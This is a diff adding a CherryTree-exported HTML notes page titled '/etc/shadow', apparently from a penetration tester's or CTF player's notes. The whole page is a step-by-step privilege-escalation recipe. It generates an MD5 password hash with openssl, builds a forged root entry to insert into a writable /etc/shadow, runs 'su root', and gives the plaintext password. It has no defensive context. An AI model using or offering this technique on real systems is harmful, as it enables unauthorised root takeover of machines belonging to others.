@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>/etc/shadow</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>/etc/shadow</h1><br/>openssl passwd -1 -salt root coolhand<br />    $1$root$QLjiLXyqZyG8UZoetHo2t1<br />add root: to the begining and :17764:0:99999:7::: to the end so it looks like this<br /><br />root:$1$root$QLjiLXyqZyG8UZoetHo2t1:17764:0:99999:7:::<br />make this a line in /etc/shadow and boom!<br />su root<br />        <br />        <br />        <br />If you are prompted for a password, its coolhand</div></body></html>
